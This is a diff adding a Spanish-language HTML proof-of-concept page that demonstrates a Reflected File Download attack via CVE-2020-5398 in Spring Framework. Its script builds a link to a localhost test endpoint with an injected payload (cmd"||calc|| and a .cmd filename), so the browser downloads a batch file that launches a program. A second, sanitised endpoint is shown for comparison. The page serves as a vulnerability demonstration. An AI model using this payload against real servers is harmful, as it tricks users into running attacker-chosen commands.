@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+</head>
+<body>
+
+	<div class="container">
+
+		<div class="jumbotron">
+  			<h1 class="display-4">Ataque RFD</h1>
+			<p class="lead">Prototipo simple de ataque RFD.</p>
+  			<hr class="my-4">
+  			<p>Este utiliza la vulnerabilidad encontrada en el header Content Disposition de Spring Framework.</p>
+  			<a class="btn btn-primary btn-lg" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5398" target="_blank" role="button">CVE-2020-5398</a>
+		</div>
+
+
+		<div class="card" style="text-align: center">
+			<h5 class="card-title">Links de descarga</h5>
+			<div class="card-body">
+				<div class="d-flex flex-row justify-content-center">
+
+					<a class="btn btn-success" href='http://localhost:8080/vulnerable?name=test&filename=testfile' style="margin-right: 20px">Descargar</a>
+					<a class="btn btn-danger" id="vulnerable-link" href="" style="margin-left: 20px">Descargar Vulnerable</a>				
+				    <a class="btn btn-warning" id="not-vulnerable-link" href="" style="margin-left: 20px">Descargar Limpiando filename</a>	
+				</div>				
+			</div>
+		</div>
+		
+
+
+	</div>
+
+
+<script>
+	
+	window.onload = function() {
+  		vulnerableUrl();
+  		notVulnerableUrl();	
+	};
+
+	function vulnerableUrl() {
+
+		params = "vulnerable?name=cmd\"||calc||"
+		url = "http://localhost:8080/" + encodeURI(params) + '&filename=testfile.cmd";';
+		document.getElementById("vulnerable-link").href = url;
+	}
+
+	function notVulnerableUrl() {
+
+		params = "not-vulnerable?name=cmd\"||calc||"
+		url = "http://localhost:8080/" + encodeURI(params) + '&filename=testfile.cmd";';
+		document.getElementById("not-vulnerable-link").href = url;
+	}
+
+</script>
+</body>
+</html>
